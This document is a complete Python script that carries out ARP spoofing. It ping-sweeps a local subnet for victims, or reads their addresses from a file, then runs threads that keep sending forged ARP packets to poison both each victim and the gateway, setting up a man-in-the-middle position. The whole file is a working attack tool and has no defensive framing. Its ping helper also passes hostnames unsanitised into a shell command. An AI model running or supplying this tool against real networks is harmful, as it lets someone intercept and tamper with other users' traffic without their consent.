#!/usr/bin/python3

import re
import os
import time
import socket
import threading
import binascii
import netifaces
import argparse

from subprocess import Popen, PIPE


subnet = "192.168.1.0/24"
interfaces = netifaces.interfaces()

interface = None
gateway = None
mac = None

victims = []
threads = []
_output = []


class attackThread(threading.Thread):
	def __init__(self, victim, gateway,  mac, connect):
		threading.Thread.__init__(self)
		self.victim = victim
		self.connect = connect

		mac = encode_mac(mac)
		mac_victim = get_mac(victim)

		self.request = mac_victim + mac + b'\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01' + mac
		self.request += socket.inet_aton(gateway) + mac_victim + socket.inet_aton(victim)

	def run(self):
		while True:
			self.connect.send(self.request)
			print("ARP packet send to " + self.victim + " (0x0806), operation code 0x0001")
			time.sleep(0.3)


def attack(ips):
	global threads, mac, gateway, interface

	protocol = socket.htons(0x0800)
	connect = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, protocol)
	connect.bind((interface, protocol))

	for victim_ip in ips:
		threads.append(attackThread(victim_ip, gateway, mac, connect))
		threads.append(attackThread(gateway, victim_ip, mac, connect))
		time.sleep(0.4)

	for th in threads:
		th.start()


def main():
	global interface, victims, gateway, mac
	args = arguments()

	interface = args.interface
	gateway = interface_enabled(interface)

	if gateway is None:
		print(f"Interface {interface} not found.")
		raise KeyboardInterrupt

	mac = my_mac(interface)

	try:
		if args.target is None:
			raise IndexError

		with open(args.target, 'r') as file:
			for line in file.readlines():
				ip = line.strip()

				if check_ip(ip):
					victims.append(ip)

				else:
					print(f"Invalid IP - {ip}")

		if len(victims) < 1:
			print("No valid IP's in your file.")
			raise KeyboardInterrupt

	except IndexError:
		print("Scanning computers in local network..")
		scanner(subnet)

	print("Starting ARP spoofing..")
	attack(victims)


def arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', required=True, dest="interface", help="Set a interface")
	parser.add_argument('-t', '--target', dest="target", help="Set a file with local IPs")

	return parser.parse_args()


def scanner(ip):
	global victims, interface, gateway, subnet

	victims = local_ping_scanner(subnet)
	local_ip = my_ip(interface)
	result = []

	print("")
	for element in victims:
		if element != gateway and element != local_ip:
			result.append(element)
			print(" -- " + element)

	if len(result) < 1:
		print("No computers found on the local network, try again.")
		raise KeyboardInterrupt

	else:
		print("")
		answer = input("Continue? [Y/n] ").lower()

		if answer != 'y':
			raise KeyboardInterrupt

	victims = result
	return victims


class pingThread(threading.Thread):
	def __init__(self, address):
		threading.Thread.__init__(self)
		self.address = address

	def run(self):
		response = ping(self.address)

		if "ttl" in response.read().lower():
			_output.append(self.address)


def ping(hostname):
	return os.popen(f"ping -c 1 {hostname}")


def local_ping_scanner(mask):
	global _output

	subnet ='.'.join(mask.split('.')[:-1])
	ths = []

	for net in range(1, 255):
		th = pingThread(subnet + '.' + str(net))
		ths.append(th)

	for th in ths:
		th.start()

	o = _output
	_output = []

	return o


def check_ip(ip):
	try:
		socket.inet_aton(ip)
		return True

	except socket.error:
		return False


def get_mac(local_ip):
	ping(local_ip)

	pid = Popen(["arp", "-a", local_ip], stdout=PIPE)
	spid = pid.communicate()[0].decode()
	local_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", spid).groups()[0]

	return encode_mac(local_mac)


def encode_mac(address):
	return binascii.unhexlify(address.strip().replace(':', ''))


def my_mac(interface):
	return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]["addr"]


def my_ip(interface):
	return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["addr"]


def interface_enabled(interface):
	gateways = netifaces.gateways()["default"]

	for i in gateways:
		if gateways[i][1] == interface:
			return gateways[i][0]

	return None


if __name__== "__main__":
	try:
		main()

	except KeyboardInterrupt:
		print("Attack was stopped.")
